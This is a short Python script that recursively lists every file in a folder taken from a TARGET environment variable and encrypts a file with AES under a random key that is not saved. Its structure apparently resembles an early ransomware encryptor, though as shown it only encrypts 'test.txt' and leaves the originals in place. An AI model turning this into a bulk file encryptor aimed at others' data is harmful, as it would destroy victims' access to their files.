import os
from sys import argv
from collections import deque
from typing import Iterable
from mykeys import get_AES_random_key
from Crypto.Cipher import AES


def all_files(full_path_folder: str) -> Iterable:
    '''Returns a list(deque) with all the files in
    the given folder.'''
    list_of_all_files = deque()
    try:

        for root, __, files in os.walk(full_path_folder):
            for file in files:
                list_of_all_files.append(os.path.join(root, file))

        return list_of_all_files

    except FileNotFoundError:
        print(f"The folder '{full_path_folder}' does not exist.")
    except PermissionError:
        print(f"Without permission to access '{full_path_folder}'.")

    return list_of_all_files


def encrypt_file(file_name: str, aes_key: bytes) -> None:
    file_data = None
    with open(file_name, 'rb') as f:
        file_data = f.read()

    cipher = AES.new(aes_key, AES.MODE_EAX)

    encrypted_data, tag = cipher.encrypt_and_digest(file_data)

    with open(file_name + '.enc', 'wb') as f:
        f.write(cipher.nonce)
        f.write(tag)
        f.write(encrypted_data)


def print_iterable(it: Iterable) -> None:
    for element in it:
        print(element)


if __name__ == '__main__':

    TARGET = None
    if len(argv) == 2 and argv[1] == 'test':
        from dotenv import load_dotenv
        load_dotenv()
        TARGET = os.getenv('TARGET')
    TARGET = '' if TARGET == None else TARGET

    print('target:', TARGET)

    files = all_files(TARGET)
    print_iterable(files)
    print(len(get_AES_random_key()))

    encrypt_file('test.txt', get_AES_random_key())
